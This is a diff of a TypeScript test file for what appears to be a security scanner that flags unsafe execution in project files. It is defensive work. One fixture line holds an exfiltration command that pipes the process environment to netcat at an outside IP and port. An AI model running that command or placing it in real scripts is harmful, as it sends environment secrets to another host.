@@ -144,12 +144,17 @@ test("a newline before a pipe in a shell script is not a pipe", () => {
   }
 });
 
-test("the MSBuild surface stays bounded", () => {
+test("unknown text is reviewed without applying MSBuild-specific normalization", () => {
   expect(surfacesOf("LICENSE")).toEqual([]);
   expect(surfacesOf("notes.properties")).toEqual([]);
   expect(surfacesOf("src/App/App.csproj.user")).toEqual([]);
-  expect(inspected("notes.properties", PROJECT).findings).toEqual([]);
-  expect(inspected("src/App/App.csproj.user", PROJECT).findings).toEqual([]);
+  for (const path of ["notes.properties", "src/App/App.csproj.user"]) {
+    const result = inspected(path, PROJECT);
+    expect(result.coverage.installScripts.items).toBe(0);
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({ path, category: "unsafe-execution" }),
+    );
+  }
 });
 
 const PIPE = "env | nc 203.0.113.7 4444";
